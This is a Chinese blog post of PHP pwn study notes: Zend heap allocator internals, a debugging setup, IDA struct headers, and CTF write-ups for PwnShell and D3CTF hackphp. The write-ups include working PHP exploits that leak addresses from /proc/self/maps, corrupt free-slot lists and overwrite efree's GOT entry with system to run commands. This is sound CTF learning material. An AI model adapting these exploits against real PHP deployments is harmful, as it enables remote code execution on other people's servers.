+++
title = 'Phppwn笔记'
date = 2026-02-02T11:41:59+08:00
draft = false
categories = ["pwn"]
hiddenFromHomePage=false
summary = ""

+++



<!--more-->



## 参考文章

有些前置的东西可以看这些文章

https://bbs.kanxue.com/thread-286446.htm

https://www.anquanke.com/post/id/204404

https://imlzh1.github.io/posts/PHP-So-Pwn/#zend_parse_parameters

https://www.bookstack.cn/read/php7-internal/7-implement.md

https://xuanxuanblingbling.github.io/ctf/pwn/2020/05/05/mixture/

‍



## 笔记







### 常用

搭建镜像的时候，要下载`gdbserver`和`vim`，方便后面做题

```
RUN apt-get install -y gdbserver vim
```



查看配置和扩展：

```
php -i | grep -E "disable_functions|disable_classes|extension = |Loaded Configuration File|extension_dir"
php -m | grep hackphp
```





### emalloc_playground

写了一个类似`how2heap`的`malloc_playground`的扩展，用于理解`emalloc`的底层行为



```c
//emalloc_playground.c
/* emalloc_playground extension for PHP */
#ifdef HAVE_CONFIG_H
#include "config.h"
#endif

#include "php.h"
#include "php_emalloc_playground.h"
#include "emalloc_playground_arginfo.h"
#include <stdio.h>
#include <stdlib.h>
#include <inttypes.h>
#include <ctype.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

/* 分配记录结构 */
typedef struct {
    void *ptr;
    size_t size;
} allocation_t;

/* 全局状态 */
static struct {
    allocation_t *allocations;
    size_t count;
    size_t capacity;
    zend_bool initialized;
} playground_state = {0};

/* 初始化模块 */
PHP_MINIT_FUNCTION(emalloc_playground)
{
    playground_state.allocations = ecalloc(8, sizeof(allocation_t));
    playground_state.capacity = 8;
    playground_state.count = 0;
    playground_state.initialized = 1;
    return SUCCESS;
}

/* 关闭模块 */
PHP_MSHUTDOWN_FUNCTION(emalloc_playground)
{
    if (playground_state.initialized) {
        for (size_t i = 0; i < playground_state.count; i++) {
            if (playground_state.allocations[i].ptr) {
                efree(playground_state.allocations[i].ptr);
            }
        }
        efree(playground_state.allocations);
        playground_state.initialized = 0;
    }
    return SUCCESS;
}

/* 辅助函数：移除首尾空格 */
static void string_trim(char *s) {
    char *p = s;
    while (isspace((unsigned char)*p)) p++;
    if (p != s) memmove(s, p, strlen(p) + 1);
    size_t len = strlen(s);
    while (len > 0 && isspace((unsigned char)s[len-1])) s[--len] = '\0';
}

/* 解析大小字符串（支持十六进制） */
static size_t parse_size_string(const char *s) {
    if (!s) return 0;
    while (isspace((unsigned char)*s)) s++;
    if (s[0]=='0' && (s[1]=='x' || s[1]=='X')) {
        return (size_t) strtoull(s+2, NULL, 16);
    } else {
        return (size_t) strtoull(s, NULL, 10);
    }
}

/* 添加新分配记录 */
static size_t add_allocation(void *ptr, size_t size) {
    if (!playground_state.initialized) return SIZE_MAX;
    
    if (playground_state.count + 1 > playground_state.capacity) {
        size_t newcap = playground_state.capacity * 2;
        allocation_t *newalloc = erealloc(
            playground_state.allocations, 
            sizeof(allocation_t) * newcap
        );
        if (!newalloc) return SIZE_MAX;
        
        playground_state.allocations = newalloc;
        playground_state.capacity = newcap;
    }
    
    playground_state.allocations[playground_state.count].ptr = ptr;
    playground_state.allocations[playground_state.count].size = size;
    return playground_state.count++;
}

/* 核心交互函数 */
PHP_FUNCTION(emalloc_playground)
{
    ZEND_PARSE_PARAMETERS_NONE();
    
    if (!playground_state.initialized) {
        php_error(E_WARNING, "Playground not initialized");
        RETURN_FALSE;
    }

    pid_t pid = getpid();
    php_printf("=== PHP emalloc Playground ===\n");
    php_printf("PID: %d\n", (int)pid);
    php_printf("Type 'help' for commands\n");

    char linebuf[512];
    while (1) {
        php_printf("> ");
        if (fgets(linebuf, sizeof(linebuf), stdin) == NULL) {
            php_printf("\nExit: EOF received\n");
            break;
        }
        
        string_trim(linebuf);
        if (linebuf[0] == '\0') continue;

        char *cmd = strtok(linebuf, " \t");
        if (!cmd) continue;

        if (strcmp(cmd, "exit") == 0 || strcmp(cmd, "quit") == 0) {
            php_printf("Exiting playground\n");
            break;

        } else if (strcmp(cmd, "pid") == 0) {
            php_printf("Process ID: %d\n", (int)pid);

        } else if (strcmp(cmd, "emalloc") == 0 ||strcmp(cmd, "malloc") == 0) {
            char *arg = strtok(NULL, " \t");
            size_t sz = parse_size_string(arg);
            
            if (sz == 0) {
                php_printf("Error: Size must be > 0\n");
                continue;
            }

            void *p = emalloc(sz);
            memset(p, 0xCC, sz); // 填充测试模式
            
            size_t idx = add_allocation(p, sz);
            if (idx == SIZE_MAX) {
                php_printf("Error: Failed to store allocation\n");
                efree(p);
                continue;
            }
            
            php_printf("[%zu] Allocated %zu bytes at 0x%" PRIxPTR "\n", 
                      idx, sz, (uintptr_t)p);

        } else if (strcmp(cmd, "calloc") == 0) {
            char *arg1 = strtok(NULL, " \t");
            char *arg2 = strtok(NULL, " \t");
            size_t nm = parse_size_string(arg1);
            size_t sz = parse_size_string(arg2);
            
            if (nm == 0 || sz == 0) {
                php_printf("Error: Invalid calloc parameters\n");
                continue;
            }

            size_t total_size;
            if (__builtin_mul_overflow(nm, sz, &total_size)) {
                php_printf("Error: Size overflow\n");
                continue;
            }

            void *p = ecalloc(nm, sz);
            size_t idx = add_allocation(p, total_size);
            if (idx == SIZE_MAX) {
                php_printf("Error: Failed to store allocation\n");
                efree(p);
                continue;
            }
            
            php_printf("[%zu] Calloc allocated %zu bytes at 0x%" PRIxPTR "\n", 
                      idx, total_size, (uintptr_t)p);

        } else if (strcmp(cmd, "realloc") == 0) {
            char *idxs = strtok(NULL, " \t");
            char *szs = strtok(NULL, " \t");
            if (!idxs || !szs) {
                php_printf("Usage: realloc <index> <size>\n");
                continue;
            }
            
            size_t idx = (size_t) strtoull(idxs, NULL, 10);
            size_t newsz = parse_size_string(szs);
            
            if (idx >= playground_state.count || 
                !playground_state.allocations[idx].ptr) {
                php_printf("Error: Invalid index %zu\n", idx);
                continue;
            }
            
            void *oldp = playground_state.allocations[idx].ptr;
            void *newp = erealloc(oldp, newsz);
            
            if (!newp && newsz > 0) {
                php_printf("Error: Realloc failed for index %zu\n", idx);
                continue;
            }
            
            playground_state.allocations[idx].ptr = newp;
            playground_state.allocations[idx].size = newsz;
            
            php_printf("[%zu] Reallocated to %zu bytes at 0x%" PRIxPTR "\n", 
                      idx, newsz, (uintptr_t)newp);

        } else if (strcmp(cmd, "free") == 0) {
            char *idxs = strtok(NULL, " \t");
            if (!idxs) {
                php_printf("Usage: free <index>\n");
                continue;
            }
            
            size_t idx = (size_t) strtoull(idxs, NULL, 10);
            if (idx >= playground_state.count || 
                !playground_state.allocations[idx].ptr) {
                php_printf("Error: Invalid index %zu\n", idx);
                continue;
            }
            
            efree(playground_state.allocations[idx].ptr);
            playground_state.allocations[idx].ptr = NULL;
            playground_state.allocations[idx].size = 0;
            php_printf("[%zu] Freed\n", idx);

        } else if (strcmp(cmd, "show") == 0 || strcmp(cmd, "list") == 0) {
            php_printf("\nActive Allocations:\n");
            php_printf("Index   Address          Size\n");
            php_printf("--------------------------------\n");
            
            for (size_t i = 0; i < playground_state.count; i++) {
                if (playground_state.allocations[i].ptr) {
                    php_printf("%-6zu  0x%-14" PRIxPTR "  %zu\n", 
                              i, 
                              (uintptr_t)playground_state.allocations[i].ptr,
                              playground_state.allocations[i].size);
                }
            }

        } else if (strcmp(cmd, "clear") == 0) {
            size_t freed = 0;
            for (size_t i = 0; i < playground_state.count; i++) {
                if (playground_state.allocations[i].ptr) {
                    efree(playground_state.allocations[i].ptr);
                    playground_state.allocations[i].ptr = NULL;
                    playground_state.allocations[i].size = 0;
                    freed++;
                }
            }
            php_printf("Freed %zu allocations\n", freed);

        } else if (strcmp(cmd, "help") == 0) {
            php_printf("\nAvailable Commands:\n");
            php_printf("  malloc <size>       - Allocate memory (e.g., malloc 1024)\n");
            php_printf("  calloc <num> <size> - Allocate zeroed memory\n");
            php_printf("  realloc <idx> <size>- Resize allocation\n");
            php_printf("  free <idx>          - Free allocation\n");
            php_printf("  show                - List active allocations\n");
            php_printf("  clear               - Free all allocations\n");
            php_printf("  pid                 - Show process ID\n");
            php_printf("  help                - Show this help\n");
            php_printf("  exit/quit           - Exit playground\n");

        } else {
            php_printf("Unknown command: '%s' (type 'help' for commands)\n", cmd);
        }
    }
    
    RETURN_TRUE;
}

/* 扩展函数列表 */
static const zend_function_entry emalloc_playground_functions[] = {
    PHP_FE(emalloc_playground, arginfo_emalloc_playground)
    PHP_FE_END
};

/* 模块入口 */
zend_module_entry emalloc_playground_module_entry = {
    STANDARD_MODULE_HEADER,
    "emalloc_playground",                    /* Extension name */
    emalloc_playground_functions,            /* Function entries */
    PHP_MINIT(emalloc_playground),           /* Module init */
    PHP_MSHUTDOWN(emalloc_playground),       /* Module shutdown */
    NULL,                                    /* Request init */
    NULL,                                    /* Request shutdown */
    NULL,                                    /* Module info */
    "1.0",                                   /* Version */
    STANDARD_MODULE_PROPERTIES
};

#ifdef COMPILE_DL_EMALLOC_PLAYGROUND
ZEND_GET_MODULE(emalloc_playground)
#endif

```

`emalloc_playground.stub.php`

```php
<?php

/**
 * @generate-class-entries
 * @undocumentable
 */

 function emalloc_playground(): bool {}
```





```
php ./ext_skel.php --ext emalloc_playground --onlyunix --vendor "j4f"
```

然后将上面的两个文件复制进相应的文件里

```
phpize
./configure --with-php-config=/usr/bin/php-config
```

> 这里我修改了`Makefile`中的CFLAGS为`CFLAGS = -g3 -O0`

```
make
```

然后把生成的扩展文件复制进`extension_dir`，在`php.ini`中加上`extension=emalloc_playground.so`



### ida逆向



在phppwn逆向的时候，常遇到类似这样的东西：

{{< image src="/img/phppwn/phppwn_re_struct/php_re_struct.png" width="900px">}}

其实它是对传入参数的类型进行判断，但是看起来不太直观

IDA中支持导入C头文件，修复一些结构体

修复后：

```c
if ( v15->u1.v.type == IS_ARRAY )
    {
      if ( v16->u1.v.type == IS_STRING )
      {
```





<br>

导入方式：`File` -> `Load file` ->  `Parse C header file`，然后选择这个头文件导入。

导入后就能看到`Local Types`中有相关的结构体



<br>



使用方式：

- 右键需要convert的变量，选择`Convert to struct *...`，其中常用的结构体有：`zval`、`string`、`array`
- 至于相关变量结构体改成类似`IS_ARRAY`。右键需要改的数字，选择`Enum`，选择`zend_type`
- `zval`类型还需要额外设置union类型



```c
//php_struct.h

//定义基本类型
typedef unsigned char uint8_t;
typedef unsigned short uint16_t;
typedef unsigned int uint32_t;
typedef unsigned long long uint64_t;
typedef long long int64_t;

typedef unsigned char      zend_uchar;
typedef long long          zend_long;
typedef unsigned long zend_ulong;

//zval.u1.type类型
typedef enum {
    IS_NULL = 0,
    IS_FALSE = 1,
    IS_TRUE = 2,
    IS_LONG = 4,
    IS_DOUBLE = 5,
    IS_STRING = 6,
    IS_ARRAY = 7,
    IS_OBJECT = 8,
    IS_RESOURCE = 9,
    IS_REFERENCE = 10,
    IS_CONSTANT = 11,
    IS_CONSTANT_AS = 12,
    _IS_BOOL = 13,
    IS_CALLABLE = 14,
    IS_INDIRECT = 15,
    IS_PTR = 17
} zend_type;

//前置声明
typedef struct _zval_struct zval;
typedef struct _zend_array HashTable;
typedef struct _zend_string zend_string;
typedef struct _zend_object zend_object;
typedef struct _zend_resource zend_resource;
typedef struct _Bucket Bucket;
typedef void (*dtor_func_t)(zval *pDest);
typedef struct _zend_reference  zend_reference;
typedef struct _zend_ast_ref    zend_ast_ref;
typedef struct _zend_object_handlers zend_object_handlers;
typedef struct _zend_class_entry     zend_class_entry;
typedef union  _zend_function        zend_function;
typedef struct _zend_refcounted_v zend_refcounted_v;

//zend_refcounted_h
typedef struct _zend_refcounted_v {
    uint8_t    type;
    uint8_t    flags;
    uint16_t   gc_info;
} zend_refcounted_v;

typedef union _zend_refcounted_u {
    zend_refcounted_v v;
    uint32_t type_info;
} zend_refcounted_u;

typedef struct _zend_refcounted_h {
    uint32_t refcount;
    zend_refcounted_u u;
} zend_refcounted_h;


//_zend_string
typedef struct _zend_string {
    zend_refcounted_h gc;  // 8字节
    uint64_t h;            // 8字节
    uint32_t len;          // 4字节
    char val[1];           // 1字节（+3字节padding，对齐到8）
}string;


typedef struct _zval_u1_v {
    uint8_t type;
    uint8_t type_flags;
    uint8_t const_flags;
    uint8_t reserved;
} zval_u1_v;

typedef union _zval_u1 {
    zval_u1_v v;
    uint32_t type_info;
} zval_u1;

typedef union _zval_u2 {
    uint32_t var_flags;
    uint32_t next;
    uint32_t cache_slot;
    uint32_t lineno;
    uint32_t num_args;
    uint32_t fe_pos;
} zval_u2;

//这里一些对象使用void*避免具体类型
typedef union _zend_value {
    zend_long         lval;
    double            dval;
    void             *counted;
    zend_string      *str;
    HashTable        *arr;
    zend_object      *obj;
    zend_resource    *res;
    zend_reference   *ref;
    zend_ast_ref     *ast;
    _zval_struct     *zv;
    void             *ptr;
    zend_class_entry *ce;
    zend_function    *func;
    struct {
        uint32_t w1;
        uint32_t w2;
    } ww;
} zend_value;

typedef struct _zval_struct {
    zend_value value;  // 8字节
    zval_u1 u1;        // 4字节
    zval_u2 u2;        // 4字节
}zval;


//_zend_array
typedef struct _Bucket {
    _zval_struct      val;
    zend_ulong        h;
    _zend_string      *key;
}Bucket;

typedef struct _zend_array_v
{
    zend_uchar    flags;
    zend_uchar    nApplyCount;
    zend_uchar    nIteratorsCount;
    zend_uchar    reserve;
}_zend_array_v;

typedef union _zend_array_u
{
    _zend_array_v v;
    uint32_t flag;
}_zend_array_u;

typedef struct _zend_array
{
    zend_refcounted_h gc; //8字节
    _zend_array_u u;
    uint32_t          nTableMask;
    Bucket           *arData;
    uint32_t          nNumUsed;
    uint32_t          nNumOfElements;
    uint32_t          nTableSize; 
    uint32_t          nInternalPointer; 
    zend_long         nNextFreeElement;
    dtor_func_t       pDestructor;
}HashTable;

//_zend_resource
typedef struct _zend_resource {
    zend_refcounted_h gc;
    int               handle;
    int               type;
    void             *ptr;
}zend_resource;

//_zend_object
typedef struct _zend_object {
    zend_refcounted_h           gc;
    uint32_t                    handle;
    zend_class_entry           *ce;
    const zend_object_handlers *handlers;
    HashTable                  *properties;
    _zval_struct                properties_table[1];
}zend_object;
typedef _zend_array array;
```











### php堆内存管理

#### 基本数据结构

```c
struct _zend_mm_heap {
#if ZEND_MM_STAT
    size_t             size; //当前已用内存数
    size_t             peak; //内存单次申请的峰值
#endif
    zend_mm_free_slot *free_slot[ZEND_MM_BINS]; // 小内存分配的可用位置链表，ZEND_MM_BINS等于30，即此数组表示的是各种大小内存对应的链表头部
    ...
    zend_mm_huge_list *huge_list;               //大内存链表
    zend_mm_chunk     *main_chunk;              //指向chunk链表头部
    zend_mm_chunk     *cached_chunks;           //缓存的chunk链表
    int                chunks_count;            //已分配chunk数
    int                peak_chunks_count;       //当前request使用chunk峰值
    int                cached_chunks_count;     //缓存的chunk数
    double             avg_chunks_count;        //chunk使用均值，每次请求结束后会根据peak_chunks_count重新计算：(avg_chunks_count+peak_chunks_count)/2.0
}
struct _zend_mm_chunk {
    zend_mm_heap      *heap; //指向heap
    zend_mm_chunk     *next; //指向下一个chunk
    zend_mm_chunk     *prev; //指向上一个chunk
    int                free_pages; //当前chunk的剩余page数
    int                free_tail;               /* number of free pages at the end of chunk */
    int                num;
    char               reserve[64 - (sizeof(void*) * 3 + sizeof(int) * 3)];
    zend_mm_heap       heap_slot; //heap结构，只有主chunk会用到
    zend_mm_page_map   free_map; //标识各page是否已分配的bitmap数组，总大小512bit，对应page总数，每个page占一个bit位
    zend_mm_page_info  map[ZEND_MM_PAGES]; //各page的信息：当前page使用类型(用于large分配还是small)、占用的page数等
};
//按固定大小切好的small内存槽
struct _zend_mm_free_slot {
    zend_mm_free_slot *next_free_slot;//此指针只有内存未分配时用到，分配后整个结构体转为char使用
};
```



{{< image src="/img/phppwn/zend_heap.png">}}



#### small内存分配

`emalloc`的底层函数，简化后：

```c
void *zend_mm_alloc_heap(zend_mm_heap *heap, size_t size)
{
    void *ptr;

#if ZEND_DEBUG
    size_t real_size = size;
#endif

    // ---- 1. 小块分配 ----
    if (size <= ZEND_MM_MAX_SMALL_SIZE) {
        ptr = zend_mm_alloc_small(heap, size);
    }

    // ---- 2. 中等块分配 ----
    else if (size <= ZEND_MM_MAX_LARGE_SIZE) {
        ptr = zend_mm_alloc_large(heap, size);
    }

    // ---- 3. 超大块分配 ----
    else {
        ptr = zend_mm_alloc_huge(heap, size);
    }
    return ptr;
}

```

可以看出php申请的堆块根据大小分三种：`small`、`large`、`huge`

其中

```c
#define ZEND_MM_MIN_SMALL_SIZE		8
#define ZEND_MM_MAX_SMALL_SIZE      3072	//3KB
#define ZEND_MM_MAX_LARGE_SIZE      (ZEND_MM_CHUNK_SIZE - (ZEND_MM_PAGE_SIZE * ZEND_MM_FIRST_PAGE))
```

- 小于`3KB`->`small`
- 大于`3KB`，小于`2044KB`(511 page_size)，不是512个page是因为第一个page用于存储`_zend_mm_heap`结构体
- 大于`2MB`->`huge`

##### zend_mm_alloc_small

```c
static zend_always_inline void *zend_mm_alloc_small(zend_mm_heap *heap, int bin_num ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)
{
	ZEND_ASSERT(bin_data_size[bin_num] >= ZEND_MM_MIN_USEABLE_BIN_SIZE);

#if ZEND_MM_STAT
	do {
		size_t size = heap->size + bin_data_size[bin_num];
		size_t peak = MAX(heap->peak, size);
		heap->size = size;
		heap->peak = peak;
	} while (0);
#endif

	if (EXPECTED(heap->free_slot[bin_num] != NULL)) {
		zend_mm_free_slot *p = heap->free_slot[bin_num];
		heap->free_slot[bin_num] = zend_mm_get_next_free_slot(heap, bin_num, p);
		return p;
	} else {
		return zend_mm_alloc_small_slow(heap, bin_num ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);
	}
}
```

相应size的`free_slot`中有堆块就从`free_slot`中取第一个，并更新`free_slot`链表头

```c
static zend_always_inline zend_mm_free_slot *zend_mm_get_next_free_slot(zend_mm_heap *heap, uint32_t bin_num, zend_mm_free_slot* slot)
{
	zend_mm_free_slot *next = slot->next_free_slot;
	if (EXPECTED(next != NULL)) {
		zend_mm_free_slot *shadow = ZEND_MM_FREE_SLOT_PTR_SHADOW(slot, bin_num);
		if (UNEXPECTED(next != zend_mm_decode_free_slot(heap, shadow))) {
			zend_mm_panic("zend_mm_heap corrupted");
		}
	}
	return (zend_mm_free_slot*)next;
}
```

没有的话就执行**`zend_mm_alloc_small_slow`**，这个函数：

- 向堆申请新的页
- 将页分成多个小块，返回第一个小块
- **其他块链入相应的`slot`**





### 调试

#### phpgdb

调试用的这位师傅写的东西：[phpdbg](https://github.com/GeekCmore/phpdbg)

这里如果执行`sudo apt install php-cli-dbgsym`报错可以：

```
sudo apt update
sudo apt install ubuntu-dbgsym-keyring -y

sudo tee /etc/apt/sources.list.d/ddebs.list <<'EOF'
deb http://ddebs.ubuntu.com noble main restricted universe multiverse
deb http://ddebs.ubuntu.com noble-updates main restricted universe multiverse
EOF

sudo apt update

sudo apt install php8.3-cli-dbgsym -y
```

这种方式只能下8.3版本的符号表，如果还要其他版本的符号表：

```
sudo add-apt-repository ppa:ondrej/php -y
sudo nvim /etc/apt/sources.list.d/ondrej-ubuntu-php-noble.sources
```

把`Components: main`修改成：`Components: main main/debug`

再

```
sudo apt update
sudo apt install php8.4-cli-dbgsym
```

即可







#### 容器与容器之间进行调试

两个容器都要下载gdbserver

```
apt-get update && apt-get install -y gdbserver
```

然后被连接的容器：

```
gdbserver :8888 --args php ./exp.php
```

还要获取被连接容器的ip：

```
hostname -i
172.17.0.3
```

然后用另一个容器去连接：

```
gdb
target remote 172.17.0.3:8888
```



#### 容器与wsl2之间进行调试

如果用wsl2去远程调试容器里的程序，wsl2里：

```
gdb
target remote localhost:7777
```

> 通过`localhost`连接需要容器映射端口到本地（参数`-p`）：
>
> ```
> $ docker run -it \                           
> -p 9999:9999 \
> -p 7777:7777 \
> --name d3ctf_hackphp \
> d3ctf_hackphp
> ```
>
> 





`phpgdb`支持四个命令：`pheap` `psmall` `pelement` `pstart`

```
p alloc_globals.mm_heap
```





## 例题





### 堆off by null：PwnShell

堆菜单题



addHacker：参数是两个str，申请两个堆块，结构如下

```
//堆结构
chunkList[idx] → heap2
                 ┌──────────────────────────┐
                 │ [0] = pointer to heap1   │
                 │ [1] = len_string_1       │
                 │ [2] ← string_2           │ <- off-by-null
                 └──────────────────────────┘
                             ↑
                             │
                             │
                 ┌──────────────────────────┐
                 │ heap1                    │
                 │ [data] ← valu_1->val+4   │
                 └──────────────────────────┘
```

removeHacker：参数为lval，`efree`掉相应chunklist中的堆块

editHacker：参数一个lval，一个str。如果要写入的数据比原先heap1的少，就用原先的heap；否则free掉原来的heap1，申请一个堆块放数据

交互：

```php
function add($a, $b){
    addHacker($a, $b);
}
function rm($a){
    removeHacker($a);
}
function edit($a, $b){
    editHacker($a, $b);
}


add("abcdefghk", "bbbbbbb");
edit(0,"aaaaaa");
rm(0);
```



思路：

主要漏洞在`addHacker`中，存在`off-by-null`

```
 *((_BYTE *)heap2 + len_2 + 16) = 0;
```

可以利用这个漏洞修改0x18大小的slot链表

修改前：



{{< image src="/img/phppwn/pwnshell_1.png">}}

修改后：

{{< image src="/img/phppwn/pwnshell_2.png">}}

接着让`0x7daecbe57100`指向`_efree_got`，申请几次0x18大小的堆，改`efree_got`为system



#### exp

打的本地，远程改改system偏移，执行/readflag就行

```php
<?php
function str2Hex($str) {
    $hex = "";
    for ($i = strlen($str) - 1;$i >= 0;$i--) $hex.= dechex(ord($str[$i]));
    $hex = strtoupper($hex);
    return $hex;
}
function int2Str($i, $x = 8) {
    $re = "";
    for ($j = 0; $j < $x; $j++) {
        $re .= pack('C', $i & 0xff);
        $i >>= 8;
    }
    return $re;
}
function p64($value) {
    return pack("Q", $value); // 64-bit little-endian
}
function p32($value) {
    return pack("V", $value); // 32-bit little-endian
}
function u64($data) {
    return unpack("Q", $data)[1]; // 64-bit little-endian
}
function u32($data) {
    return unpack("V", $data)[1]; // 32-bit little-endian
}
function leakaddr($buffer){

    global $libc, $mbase, $anon_maps;
    $p = '/([0-9a-f]+)\-[0-9a-f]+ .* \/usr\/lib\/x86_64-linux-gnu\/libc.so.6/';
    // $p1 = '/([0-9a-f]+)\-[0-9a-f]+ .*  \/usr\/local\/lib\/php\/extensions\/no-debug-non-zts-20230831\/vuln.so/';
    $p1 = '/([0-9a-f]+)\-[0-9a-f]+ .*  \/usr\/lib\/php\/20230831\/vuln.so/';
    preg_match_all($p, $buffer, $libc);
    preg_match_all($p1, $buffer, $mbase);
    
    return "";
}

$libc="";
$mbase="";

ob_start("leakaddr");
include("/proc/self/maps");
$buffer = ob_get_contents();
ob_end_flush();
leakaddr($buffer);
$libc_base = hexdec($libc[1][0]);
$mod_base = hexdec($mbase[1][0]);

echo "libc base: 0x".dechex($libc_base)."\n";
echo "mod base: 0x".dechex($mod_base)."\n";

function add($a, $b){
    addHacker($a, $b);
}
function rm($a){
    removeHacker($a);
}
function edit($a, $b){
    editHacker($a, $b);
}

$system = $libc_base + 0x58750;
$efree_got = $mod_base + 0x4038;

#先emalloc 0x10+后面，再emalloc 前面
# heap2 heap1
add("/bin/sh", str_repeat("a",7));    //0
add(str_repeat("b",0x8), str_repeat("b",7));    //1
add(str_repeat("c",0x8), str_repeat("c",7));    //2
add(str_repeat("d",0x8), str_repeat("d",8));    //3

//改_efree_got为system
add(str_repeat("a",0x10).p64($efree_got),str_repeat("a",0x50));
add(str_repeat("a",0x18),str_repeat("a",0x50));
add(p64($system).p64(0).p64(0),str_repeat("b",0x50));

edit(0,"aaaaaaaaaaaaaaaaaaaa"); //触发
// tele &chunkList
```



### 堆UAF：hackphp



题目来源：D3CTF 2021 hakphp

参考：

https://github.com/UESuperGate/D3CTF-Source/blob/master/hackphp/exp.php

https://www.anquanke.com/post/id/235237#h2-5









#### 思路

```c
void __fastcall zif_hackphp_create(zend_execute_data *execute_data, zval *return_value)
{
  zval *arg_num; // rdi
  __int64 size[3]; // [rsp+0h] [rbp-18h] BYREF

  arg_num = (zval *)execute_data->This.u2.var_flags;
  size[1] = __readfsqword(0x28u);
  if ( (unsigned int)zend_parse_parameters(arg_num, &unk_2000, size) != -1 )
  {
    buf = (char *)_emalloc(size[0]);
    buf_size = size[0];
    if ( buf )
    {
      if ( (unsigned __int64)(size[0] - 0x100) <= 0x100 )
      {
        return_value->u1.type_info = 3;
        return;
      }
      _efree();
    }
  }
  return_value->u1.type_info = 2;
}
```

这里申请一个大于`0x200`的堆块后，存在UAF，就可以修改`slot`链表





**str_repeat**

`str_repeat`会调用`emalloc`申请堆块，大小为（字符数+0x18）向上对齐一个`slot`

需要把`str_repeat`赋值给一个变量，不然这个堆块会被收回

`$heap1 = str_repeat("A",0x1f0);`后，返回的是`0x210`大小的堆块，内存布局：

```
pwndbg> dq 0x7e0878471000
0x7e0878471000: 0x0000000600000001      0x0000000000000000
0x7e0878471010: 0x00000000000001f0      0x4141414141414141
0x7e0878471020: 0x4141414141414141      0x4141414141414141
0x7e0878471030: 0x4141414141414141      0x4141414141414141
```





这里选择修改`efree_got`为`system`，然后`free`掉一个存储字符串`/readflag`的堆块



#### exp

```php
<?php
 
$heap_base = 0;
$libc_base = 0;
$libc = "";
$mbase = "";

function p64($value) {
    return pack("Q", $value);
}
function p32($value) {
    return pack("V", $value);
}
function u64($data) {
    return unpack("Q", $data)[1];
}
function u32($data) {
    return unpack("V", $data)[1];
}

function leakaddr($buffer){
    global $libc, $mbase;
    $p = '/([0-9a-f]+)\-[0-9a-f]+ .* \/usr\/lib\/x86_64-linux-gnu\/libc-2.31.so/';
    $p1 = '/([0-9a-f]+)\-[0-9a-f]+ .*  \/usr\/local\/lib\/php\/extensions\/no-debug-non-zts-20190902\/hackphp.so/';
    preg_match_all($p, $buffer, $libc);
    preg_match_all($p1, $buffer, $mbase);
    return "";
}

ob_start("leakaddr");
include("/proc/self/maps");
$buffer = ob_get_contents();
ob_end_flush();
leakaddr($buffer);

$libc_base = hexdec($libc[1][0]);
$modBase = hexdec($mbase[1][0]);

$system = $libc_base + 0x52290;
$efree_got = $modBase + 0x4070;

echo "libc_base:0x" . dechex($libc_base) . "\n";
echo "modBase:0x" . dechex($modBase) . "\n";

hackphp_create(0x210);
hackphp_edit(p64($modBase+0x4178-0x28));
$heap1 = str_repeat("A",0x1f0);
$heap1 = str_repeat(p64($modBase+0x4070),(0x1f0)/8);

hackphp_edit(p64($system));
hackphp_create(0x100);
hackphp_edit("/readflag");
hackphp_delete();
```







### UAF：phpmaster

题目来源：第二届长城杯半决赛 phpmaster

参考：https://bbs.kanxue.com/thread-286086.htm





### 长城杯2025 (php-pwn) simi-final php-master

参考文章以及附件https://bbs.kanxue.com/thread-286567.htm





### N1CTF 2024—php master

https://www.ctfiot.com/213627.html

[php-exploit/n1ctf24-php-master at master · m4p1e/php-exploit](https://github.com/m4p1e/php-exploit/tree/master/n1ctf24-php-master)

https://xia0.sh/blog/save-me-web-master-pwn-n1ctf-2024-php-master/save-me-web-master-pwn-n1ctf-2024-php-master





### R3CTF2025_not_a_web_chal





### 强网杯 2025 go2php

